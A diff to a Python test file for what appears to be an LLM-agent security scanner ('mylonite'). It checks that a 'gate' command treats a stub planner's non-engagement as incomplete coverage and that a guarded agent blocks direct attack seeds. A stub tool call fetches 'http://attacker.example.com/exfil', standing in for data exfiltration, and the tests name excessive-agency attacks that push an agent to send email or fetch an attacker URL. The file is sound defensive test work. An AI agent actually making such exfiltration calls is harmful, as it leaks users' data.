@@ -14,6 +14,7 @@ Part B: Gated live test
 
 from __future__ import annotations
 
+import asyncio
 import json
 import os
 import subprocess
@@ -107,21 +108,66 @@ def _engaging_acompletion() -> Any:
     return _acompletion
 
 
-def test_gate_reference_no_finding_exits_zero(
+def _reference_scan_report(variant: str, acompletion: Any) -> Any:
+    """Run the same scan `gate` runs for `reference:<variant>`, directly, so a
+    test can read per-attempt outcomes that the CLI's own output doesn't carry.
+
+    Builds the identical engine `make_scan_fn` (gate/wiring.py) assembles for
+    the reference route, under `acompletion` patched the same way the CLI
+    invocation in the caller's test is. Deterministic and keyed off request
+    shape (see `_engaging_acompletion`'s docstring), so running it twice —
+    once through the CLI, once here — gives the same result.
+    """
+    import litellm
+
+    from mylonite.plugins._reference.reference_target_adapter import InProcessReferenceAdapter
+    from mylonite.scan.assembly import build_scan_engine, load_attack_modules, select_attack_modules
+    from mylonite.scan.engine import ScanConfig
+
+    original_acompletion = litellm.acompletion
+    original_completion = litellm.completion
+    litellm.acompletion = acompletion
+    litellm.completion = lambda *a, **kw: _benign_response()
+    try:
+        adapter = InProcessReferenceAdapter(variant=variant, model="stub")
+        all_modules, module_load_failures = load_attack_modules()
+        attack_modules = select_attack_modules(all_modules)
+        config = ScanConfig(
+            target_id=f"reference:{variant}",
+            provider="anthropic",
+            model="stub",
+        )
+        engine = build_scan_engine(
+            config,
+            adapter,
+            attack_modules=attack_modules,
+            module_load_failures=module_load_failures,
+        )
+        result = asyncio.run(engine.run())
+    finally:
+        litellm.acompletion = original_acompletion
+        litellm.completion = original_completion
+    return result.report
+
+
+def test_gate_planner_that_declines_direct_requests_is_not_clean(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    """Gate with an engaging-but-benign LLM stub: 0 findings → exit 0, no PR.
+    """The F9 false clean: a planner that never calls the tool a direct seed's
+    OWN user message asks for measured the planner declining, not the target
+    resisting. `gate` must read that as incomplete coverage, not a clean pass.
 
-    The stub makes ONE harmless tool call per attempt, then terminates. So the
-    attack is genuinely delivered and exercised against the target, and genuinely
-    does not land: the deterministic predicates see a tool-call trace with no
-    consequential action, and the LLM judge fallback returns success=False.
-    `scan_fn` returns [], `run_gate` short-circuits before generate/validate,
-    prints "no exploit found — nothing to gate", and exits 0.
+    Same read_note-only stub as before (`_engaging_acompletion`): ONE harmless
+    tool call per attempt, then terminate. Against `reference:vulnerable`,
+    that stub never calls `send_email` or `web_fetch` — the two tools the
+    direct seeds' user messages ask for outright — so those two attempts are
+    `skipped_planner_no_engagement`, and `gate` exits 2 (incomplete coverage,
+    nothing found), not 0.
 
-    The tool call is what makes this a real clean result rather than a vacuous
-    one; see `test_gate_exits_nonzero_when_the_planner_never_engages` below for
-    the other half of the contract.
+    See `test_gate_reference_guarded_blocks_the_literal_direct_requests_exits_zero`
+    below for the real exit-0 path, and
+    `test_gate_exits_nonzero_when_the_planner_never_engages` for the
+    zero-tool-calls-at-all variant of this same false clean.
     """
     import litellm
 
@@ -138,14 +184,110 @@ def test_gate_reference_no_finding_exits_zero(
     out_dir = tmp_path / ".mylonite" / "gate"
     res = runner.invoke(app, ["gate", "reference:vulnerable", "--out", str(out_dir)])
 
+    assert res.exit_code == 2, (
+        f"Expected exit 2 (incomplete coverage, nothing found), got {res.exit_code}."
+        f"\nOutput:\n{res.output}"
+    )
+    assert "MYL-NT-003" in res.output, res.output
+    # No gate artefacts should be written (short-circuit happens before generate).
+    assert not out_dir.exists() or not list(out_dir.glob("exploit_*.json")), (
+        "No exploit JSON should be written when the scan found nothing."
+    )
+
+    # The CLI output names the dominant cause but not which attempts it was —
+    # confirm those directly against a report from the same deterministic stub.
+    report = _reference_scan_report("vulnerable", _engaging_acompletion())
+    outcomes = {a.pattern_id: a.outcome for a in report.attempts}
+    assert outcomes["excessive-agency-send-email-direct-unconfirmed"] == (
+        "skipped_planner_no_engagement"
+    )
+    assert outcomes["excessive-agency-fetch-attacker-url-direct"] == (
+        "skipped_planner_no_engagement"
+    )
+
+
+def _direct_request_acompletion() -> Any:
+    """Calls the literal tool a direct seed's own user message asks for
+    (`send_email` or `web_fetch`), and otherwise makes one harmless `read_note`
+    call, then terminates — like `_engaging_acompletion`, but targeted.
+
+    Used against `reference:guarded`: the planner genuinely engages the tool
+    the direct seeds ask for, so there is no non-engagement gap, and it is the
+    guard itself — `send_email` only stages, `web_fetch` refuses an
+    unallowlisted host — that stops the attack.
+    """
+
+    async def _acompletion(*_args: object, **kwargs: object) -> SimpleNamespace:
+        if not kwargs.get("tools"):
+            return _benign_response()
+        messages = kwargs.get("messages") or []
+        if any(isinstance(m, dict) and m.get("role") == "tool" for m in messages):  # type: ignore[union-attr]
+            return _benign_response()
+        user_text = " ".join(
+            str(m.get("content") or "")
+            for m in messages
+            if isinstance(m, dict) and m.get("role") == "user"
+        )
+        if "send_email" in user_text or "send an email" in user_text:
+            call = SimpleNamespace(
+                id="c1",
+                function=SimpleNamespace(
+                    name="send_email",
+                    arguments=json.dumps(
+                        {
+                            "to": "ops@example.com",
+                            "subject": "Status update",
+                            "body": "All systems nominal.",
+                        }
+                    ),
+                ),
+            )
+        elif "fetch" in user_text and "attacker.example.com" in user_text:
+            call = SimpleNamespace(
+                id="c1",
+                function=SimpleNamespace(
+                    name="web_fetch",
+                    arguments=json.dumps({"url": "http://attacker.example.com/exfil"}),
+                ),
+            )
+        else:
+            return _benign_tool_call_response()
+        message = SimpleNamespace(content="", tool_calls=[call])
+        choice = SimpleNamespace(message=message)
+        usage = SimpleNamespace(prompt_tokens=0, completion_tokens=1, total_tokens=1)
+        return SimpleNamespace(choices=[choice], usage=usage)
+
+    return _acompletion
+
+
+def test_gate_reference_guarded_blocks_the_literal_direct_requests_exits_zero(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A real exit-0 path for the direct seeds: the planner calls the exact
+    tool each one asks for — so there is no non-engagement gap — and the
+    guarded twin's own controls are what stop it (`send_email` stages without
+    dispatching; `web_fetch` refuses the unallowlisted host). `gate` has no
+    `--weakness-class`, so this runs the full catalogue, same as
+    `test_gate_planner_that_declines_direct_requests_is_not_clean` above;
+    every other seed's request falls through to the same harmless `read_note`
+    call that test already covers.
+    """
+    import litellm
+
+    monkeypatch.setattr(litellm, "acompletion", _direct_request_acompletion())
+    monkeypatch.setattr(litellm, "completion", lambda *a, **kw: _benign_response())
+    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")
+
+    monkeypatch.chdir(tmp_path)
+    out_dir = tmp_path / ".mylonite" / "gate"
+    res = runner.invoke(app, ["gate", "reference:guarded", "--out", str(out_dir)])
+
     assert res.exit_code == 0, (
         f"Expected exit 0 (no exploit found), got {res.exit_code}.\nOutput:\n{res.output}"
     )
-    # The orchestrator's no-exploit branch prints this exact string.
     assert "nothing to gate" in res.output.lower() or "no exploit" in res.output.lower(), (
         f"Expected 'nothing to gate' or 'no exploit' in output.\nOutput:\n{res.output}"
     )
-    # No gate artefacts should be written (short-circuit happens before generate).
     assert not out_dir.exists() or not list(out_dir.glob("exploit_*.json")), (
         "No exploit JSON should be written when the scan found nothing."
     )
